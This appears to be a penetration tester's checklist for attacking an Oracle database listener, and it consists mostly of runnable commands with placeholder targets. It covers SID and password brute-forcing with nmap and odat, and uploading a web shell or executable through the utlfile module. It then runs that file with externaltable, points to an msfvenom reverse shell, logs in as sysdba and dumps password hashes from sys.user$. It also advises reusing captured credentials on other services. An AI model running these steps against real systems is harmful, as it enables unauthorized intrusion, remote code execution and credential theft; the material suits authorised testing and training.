# Oracle enumeration

## The listener
sudo nmap -sV -p 1521 --script oracle-tns-version,oracle-sid-brute <TargetIP>
sudo apt install -y odat

## The SID
odat sidguesser -s <TargetIP>
- [ ] The SID found, such as XE or ORCL, filled in as <Database>

## Accounts
odat passwordguesser -s <TargetIP> -d <Database>
- [ ] Every pair it finds tried with sqlplus below, and as sysdba

## What this account can do
odat all -s <TargetIP> -d <Database> -U '<Username>' -P '<Password>'
odat all -s <TargetIP> -d <Database> -U '<Username>' -P '<Password>' --sysdba
- [ ] Which modules work: file read and write, command execution, password hashes
A file onto the target with utlfile, such as a web shell into the web root:
odat utlfile -s <TargetIP> -d <Database> -U '<Username>' -P '<Password>' --sysdba --putFile THE-REMOTE-FOLDER <File> <File>
A program run with externaltable, once it is on the target:
odat externaltable -s <TargetIP> -d <Database> -U '<Username>' -P '<Password>' --sysdba --exec THE-REMOTE-FOLDER <File>
- [ ] A reverse shell program from msfvenom, with nc listening: :Pb shells

## SQL*Plus
sqlplus '<Username>'/'<Password>'@<TargetIP>:1521/<Database>
sqlplus '<Username>'/'<Password>'@<TargetIP>:1521/<Database> as sysdba
- [ ] sqlplus missing: Oracle Instant Client, basic and sqlplus, with its folder on PATH and LD_LIBRARY_PATH
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;
SELECT username FROM all_users;
SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM');
SELECT * FROM THE-OWNER.<Table>;
- [ ] Users and passwords in the application's tables, each tried on every other service
- [ ] DBA in user_role_privs, or a login as sysdba: the password hashes below

## Password hashes
SELECT name, password, spare4 FROM sys.user$;
- [ ] password is the old DES hash, spare4 holds the S: and T: hashes of newer versions
